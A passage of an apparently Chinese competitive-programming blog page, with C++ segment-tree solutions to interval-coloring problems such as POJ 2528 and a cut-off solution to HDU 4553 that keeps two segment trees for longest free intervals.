&#125;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].val!=<span class="number">-1</span>)&#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].val=seg[<span class="number">2</span>*i+<span class="number">1</span>].val=seg[i].val;</span><br><span class="line">        seg[i].val=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid) update(<span class="number">2</span>*i,l,r,x);</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid) update(<span class="number">2</span>*i+<span class="number">1</span>,l,r,x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(seg[i].val!=<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j = l; j &lt;= r; j++)</span><br><span class="line">			ans[j] = seg[i].val;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l==r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid =(l + r)/<span class="number">2</span>;</span><br><span class="line">    query(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    query(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)==<span class="number">1</span>)&#123;</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,<span class="number">8000</span>);</span><br><span class="line">        <span class="built_in">memset</span>(num, <span class="number">0</span>, <span class="keyword">sizeof</span>(num));</span><br><span class="line">        <span class="built_in">memset</span>(ans, <span class="number">-1</span>, <span class="keyword">sizeof</span>(ans));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> a,b,c;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">            update(<span class="number">1</span>,a+<span class="number">1</span>,b,c);</span><br><span class="line">        &#125;</span><br><span class="line">        query(<span class="number">1</span>,<span class="number">1</span>,<span class="number">8000</span>);</span><br><span class="line">        <span class="keyword">if</span>(ans[<span class="number">0</span>] != <span class="number">-1</span>)</span><br><span class="line">            num[ans[<span class="number">0</span>]] ++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">8000</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(ans[i] != <span class="number">-1</span> &amp;&amp; ans[i] != ans[i - <span class="number">1</span>])</span><br><span class="line">                num[ans[i]] ++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">8000</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(num[i])</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, i, num[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>线段树维护数组信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">8005</span>;</span><br><span class="line"><span class="keyword">int</span> val[maxn*<span class="number">3</span>],num[maxn];</span><br><span class="line"><span class="keyword">int</span> ans[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L&lt;=l&amp;&amp;r&lt;=R)&#123;</span><br><span class="line">        val[i]=x;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(val[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">        val[<span class="number">2</span>*i]=val[<span class="number">2</span>*i+<span class="number">1</span>]=val[i];</span><br><span class="line">        val[i]=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(L&lt;=mid)&#123;</span><br><span class="line">        update(<span class="number">2</span>*i,L,R,l,mid,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(R&gt;mid)&#123;</span><br><span class="line">        update(<span class="number">2</span>*i+<span class="number">1</span>,L,R,mid+<span class="number">1</span>,r,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(val[i]!=<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=l;j&lt;=r;j++)</span><br><span class="line">			ans[j]=val[i];</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;r&amp;&amp; val[i]==<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">		query(<span class="number">2</span>*i,l,mid);</span><br><span class="line">		query(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(num, <span class="number">0</span>, <span class="keyword">sizeof</span>(num));</span><br><span class="line">        <span class="built_in">memset</span>(ans, <span class="number">-1</span>, <span class="keyword">sizeof</span>(ans));</span><br><span class="line">        <span class="built_in">memset</span>(val, <span class="number">-1</span>, <span class="keyword">sizeof</span>(val));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> a,b,c;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">            update(<span class="number">1</span>,a+<span class="number">1</span>,b,<span class="number">1</span>,<span class="number">8000</span>,c);</span><br><span class="line">        &#125;</span><br><span class="line">        query(<span class="number">1</span>,<span class="number">1</span>,<span class="number">8000</span>);</span><br><span class="line">        <span class="keyword">if</span>(ans[<span class="number">0</span>] != <span class="number">-1</span>)</span><br><span class="line">            num[ans[<span class="number">0</span>]] ++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">8000</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(ans[i] != <span class="number">-1</span> &amp;&amp; ans[i] != ans[i - <span class="number">1</span>])</span><br><span class="line">                num[ans[i]] ++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">8000</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(num[i])</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, i, num[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://poj.org/problem?id=2528">POJ 2528</a></p>
<p>区间染色问题，求最后区间存在多少种不同的颜色</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> l[maxn],r[maxn];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> ans[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    seg[i].val=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l&gt;=l&amp;&amp;seg[i].r&lt;=r)&#123;</span><br><span class="line">        seg[i].val=x;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].val!=<span class="number">0</span>)&#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].val=seg[<span class="number">2</span>*i+<span class="number">1</span>].val=seg[i].val;</span><br><span class="line">        seg[i].val=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid) update(<span class="number">2</span>*i,l,r,x);</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid) update(<span class="number">2</span>*i+<span class="number">1</span>,l,r,x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].val)&#123;</span><br><span class="line">        ans[seg[i].val]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==seg[i].r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].val!=<span class="number">0</span>)&#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].val=seg[<span class="number">2</span>*i+<span class="number">1</span>].val=seg[i].val;</span><br><span class="line">        seg[i].val=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    query(<span class="number">2</span>*i,l,r);</span><br><span class="line">    query(<span class="number">2</span>*i+<span class="number">1</span>,l,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">        num.clear();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;l[i],&amp;r[i]);</span><br><span class="line">            num.push_back(l[i]);</span><br><span class="line">            num.push_back(r[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(num.begin(),num.end());</span><br><span class="line">        num.erase(unique(num.begin(),num.end()),num.end());</span><br><span class="line">        <span class="keyword">int</span> m=num.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[i+<span class="number">1</span>]-num[i]&gt;<span class="number">1</span>)&#123;</span><br><span class="line">                num.push_back(num[i+<span class="number">1</span>]<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(num.begin(),num.end());</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">0</span>,num.size()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            x=lower_bound(num.begin(),num.end(),l[i])-num.begin();</span><br><span class="line">            y=lower_bound(num.begin(),num.end(),r[i])-num.begin();</span><br><span class="line">            update(<span class="number">1</span>,x,y,i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(ans,<span class="number">0</span>,<span class="keyword">sizeof</span>(ans));</span><br><span class="line">        query(<span class="number">1</span>,<span class="number">0</span>,num.size()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans[i])&#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最大连续子区间问题-1"><a href="#最大连续子区间问题-1" class="headerlink" title="最大连续子区间问题"></a>最大连续子区间问题</h2><p><a href="https://vjudge.net/problem/HDU-4553">hdu 4553</a></p>
<p>比较复杂的线段树问题，对于女神和屌丝操作优先级不同，所以维护两个线段树。</p>
<p>对屌丝的更新操作无法覆盖女神的信息，而女神的更新信息可以覆盖屌丝的信息，更新操作则将女神和屌丝区间均清空。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100005</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> ll,rl,ml;</span><br><span class="line">    <span class="keyword">int</span> ll1,rl1,ml1;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    seg[i].ml=seg[i].ll=seg[i].rl=r-l+<span class="number">1</span>;</span><br><span class="line">    seg[i].ml1=seg[i].ll1=seg[i].rl1=r-l+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    build(i&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">    build((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].ml&lt;x)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].ll&gt;=x)<span class="keyword">return</span> seg[i].l;</span><br><span class="line">    <span class="keyword">if</span>(seg[i&lt;&lt;<span class="number">1</span>].ml&gt;=x)<span class="keyword">return</span> query(i&lt;&lt;<span class="number">1</span>,x);</span><br><span class="line">    <span class="keyword">if</span>(seg[i&lt;&lt;<span class="number">1</span>].rl+seg[(i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>].ll&gt;=x)<span class="keyword">return</span> seg[i&lt;&lt;<span class="number">1</span>].r-seg[i&lt;&lt;<span class="number">1</span>].rl+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> query((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query1</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].ml1&lt;x)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].ll1&gt;=x)<span class="keyword">return</span> seg[i].l;</span><br><span class="line">    <span class="keyword">if</span>(seg[i&lt;&lt;<span class="number">1</span>].ml1&gt;=x)<span class="keyword">return</span> query1(i&lt;&lt;<span class="number">1</span>,x);</span><br><span class="line">    <span class="keyword">if</span>(seg[i&lt;&lt;<span class="number">1</span>].rl1+seg[(i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>].ll1&gt;=x)<span class="keyword">return</span> seg[i&lt;&lt;<span class="number">1</span>].r-seg[i&lt;&lt;<span class="number">1</span>].rl1+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> query1((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pushup</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[x].l==seg[x].r)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> lson=<span class="number">2</span>*x;</span><br><span class="line">    <span class="keyword">int</span> rson=<span class="number">2</span>*x+<span class="number">1</span>;</span><br><span class="line">    seg[x].ll=seg[lson].ll;</span><br><span class="line">    <span class="keyword">if</span>(seg[lson].ll==seg[lson].r-seg[lson].l+<span class="number">1</span>)seg[x].ll+=seg[rson].ll;</span><br><span class="line">    seg[x].rl=seg[rson].rl;</span><br><span class="line">    <span class="keyword">if</span>(seg[rson].rl==seg[rson].r-seg[rson].l+<span class="number">1</span>)seg[x].rl+=seg[lson].rl;</span><br><span class="line">    seg[x].ml=max(seg[lson].ml,seg[rson].ml);</span><br><span class="line">    seg[x].ml=max(seg[x].ml,max(seg[x].ll,seg[x].rl));</span><br><span class="line">    seg[x].ml=max(seg[x].ml,seg[lson].rl+seg[rson].ll);</span><br><span class="line"></span><br><span class="line">    seg[x].ll1=seg[lson].ll1;</span><br><span class="line">    <span class="keyword">if</span>(seg[lson].ll1==seg[lson].r-seg[lson].l+<span class="number">1</span>)seg[x].ll1+=seg[rson].ll1;</span><br><span class="line">    seg[x].rl1=seg[rson].rl1;</span><br><span class="line">    <span class="keyword">if</span>(seg[rson].rl1==seg[rson].r-seg[rson].l+<span class="number">1</span>)seg[x].rl1+=seg[lson].rl1;</span><br><span class="line">    seg[x].ml1=max(seg[lson].ml1,seg[rson].ml1);</span><br><span class="line">    seg[x].ml1=max(seg[x].ml1,max(seg[x].ll1,seg[x].rl1));</span><br><span class="line">    seg[x].ml1=max(seg[x].ml1,seg[lson].rl1+seg[rson].ll1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pushdown</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==seg[i].r)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].ml==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].ml=seg[<span class="number">2</span>*i].ll=seg[<span class="number">2</span>*i].rl=<span class="number">0</span>;</span><br><span class="line">        seg[<span class="number">2</span>*i+<span class="number">1</span>].ml=seg[<span class="number">2</span>*i+<span class="number">1</span>].ll=seg[<span class="number">2</span>*i+<span class="number">1</span>].rl=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].ml==seg[i].r-seg[i].l+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].ml=seg[<span class="number">2</span>*i].ll=seg[<span class="number">2</span>*i].rl=seg[<span class="number">2</span>*i].r-seg[<span class="number">2</span>*i].l+<span class="number">1</span>;</span><br><span class="line">        seg[<span class="number">2</span>*i+<span class="number">1</span>].ml=seg[<span class="number">2</span>*i+<span class="number">1</span>].ll=seg[<span class="number">2</span>*i+<span class="number">1</span>].rl=seg[<span class="number">2</span>*i+<span class="number">1</span>].r-seg[<span class="number">2</span>*i+<span class="number">1</span>].l+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(seg[i].ml1==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].ml1=seg[<span class="number">2</span>*i].ll1=seg[<span class="number">2</span>*i].rl1=<span class="number">0</span>;</span><br><span class="line">        seg[<span class="number">2</span>*i+<span class="number">1</span>].ml1=seg[<span class="number">2</span>*i+<span class="number">1</span>].ll1=seg[<span class="number">2</span>*i+<span class="number">1</span>].rl1=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].ml1==seg[i].r-seg[i].l+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].ml1=seg[<span class="number">2</span>*i].ll1=seg[<span class="number">2</span>*i].rl1=seg[<span class="number">2</span>*i].r-seg[<span class="number">2</span>*i].l+<span class="number">1</span>;</span><br><span class="line">        seg[<span class="number">2</span>*i+<span class="number">1</span>].ml1=seg[<span class="number">2</span>*i+<span class="number">1</span>].ll1=seg[<span class="number">2</span>*i+<span class="number">1</span>].rl1=seg[<span class="number">2</span>*i+<span class="number">1</span>].r-seg[<span class="number">2</span>*i+<span class="number">1</span>].l+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==l &amp;&amp; seg[i].r==r)</span><br><span class="line">    &#123;</span><br><span class="line">        seg[i].ml=seg[i].ll=seg[i].rl=seg[i].r-seg[i].l+<span class="number">1</span>;</span><br><span class="line">        seg[i].ml1=seg[i].ll1=seg[i].rl1=seg[i].r-seg[i].l+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pushdown(i);</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid)update(i&lt;&lt;<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) update((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        update(i&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">        update((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    pushup(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update1</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==l &amp;&amp; seg[i].r==r)</span><br><span class="line">    &#123;</span><br><span class="line">        seg[i].ml=seg[i].ll=seg[i].rl=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pushdown(i);</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid)update1(i&lt;&lt;<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) update1((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        update1(i&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">        update1((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    pushup(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update2</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==l &amp;&amp; seg[i].r==r)</span><br><span class="line">    &#123;</span><br><span class="line">        seg[i].ml=seg[i].ll=seg[i].rl=<span class="number">0</span>;</span><br><span class="line">        seg[i].ml1=seg[i].ll1=seg[i].rl1=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pushdown(i);</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid)update2(i&lt;&lt;<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) update2((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,l,r);</span><br><span class="line">    <span 